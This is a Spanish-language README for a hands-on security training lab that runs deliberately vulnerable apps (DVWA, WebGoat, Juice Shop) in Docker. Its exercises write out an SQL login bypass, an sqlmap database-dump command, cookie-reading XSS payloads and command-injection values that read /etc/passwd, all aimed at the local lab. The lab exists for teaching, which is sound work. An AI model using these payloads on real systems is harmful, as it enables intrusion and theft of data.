# 🦸 Unit 3: Explotación Web y APIs - LAB PRÁCTICO

## 🎯 Objetivos del Laboratorio

Practicar **ataques web** en objetivos reales:

1. **SQL Injection** - Extraer datos de bases de datos
2. **XSS** - Cross-Site Scripting
3. **CSRF** - Cross-Site Request Forgery
4. **IDOR** - Broken Access Control
5. **API Security** - Testing de APIs REST/GraphQL

---

## 🏗️ Arquitectura

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 3                                │
│                  EXPLOTACIÓN WEB Y APIs                            │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│   ┌─────────────┐                            ┌─────────────┐     │
│   │    KALI    │        ATAQUE              │   OBJETOS   │     │
│   │   LINUX    │  ──────────────────────→    │   VULNES   │     │
│   │ (Atacante) │                            │             │     │
│   └─────────────┘                            └─────────────┘     │
│        │                                            │            │
│        │  • Burp Suite                             │            │
│        │  • SQLMap                                │            │
│        │  • Nikto                                │            │
│        │  • curl                                │            │
│        │                                          │            │
│        │        ┌─────────────┐  ┌────────────┐  │            │
│        │        │   WebGoat  │  │    DVWA    │  │            │
│        │        │   :8081    │  │   :8082    │  │            │
│        │        └─────────────┘  └────────────┘  │            │
│        │        ┌─────────────┐                 │            │
│        │        │Juice Shop  │                 │            │
│        │        │   :8083    │                 │            │
│        │        └─────────────┘                 │            │
│        │            RED: 192.168.58.0/24       │            │
└────────┼──────────────────────────────────────────┼────────────┘
         │
    SSH:2222
```

---

## 🚀 Iniciar

```bash
cd docker-labs/unit3
docker-compose up -d
```

---

## 🎯 Objetivos

| Objetivo | URL | Puerto | Vulnerabilidades |
|----------|-----|--------|------------------|
| **WebGoat** | http://localhost:8081 | 8081 | OWASP Top 10 |
| **DVWA** | http://localhost:8082 | 8082 | SQLi, XSS, CSRF |
| **Juice Shop** | http://localhost:8083 | 8083 | OWASP Top 10 |

---

## ⚔️ EJERCICIOS DE ATAQUE

### Ejercicio 1: SQL Injection (DVWA)

```bash
ssh root@localhost -p 2222
# Password: toor

# Nivel: Low
# Login bypass:
admin'--

# Con SQLMap:
sqlmap -u "http://192.168.58.x/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch
```

### Ejercicio 2: XSS Reflected (DVWA)

```bash
# Payload básico
<script>alert(document.cookie)</script>

# Payload avanzado
<img src=x onerror=alert(document.cookie)>
```

### Ejercicio 3: XSS Stored (DVWA)

```bash
# Comentario con XSS
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
```

### Ejercicio 4: Command Injection

```bash
# Ping command
127.0.0.1; ls -la
127.0.0.1; cat /etc/passwd
```

### Ejercicio 5: WebGoat - SQL Injection

```bash
# Acceder: http://localhost:8081/WebGoat
# Completar lecciones de SQLi
```

---

## 📋 Checklist

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | SQLi en DVWA | ☐ |
| 2 | XSS Reflected | ☐ |
| 3 | XSS Stored | ☐ |
| 4 | Command Injection | ☐ |
| 5 | WebGoat lessons | ☐ |
| 6 | Extraer database | ☐ |

---

## 🛑 Cleanup

```bash
docker-compose down -v
```
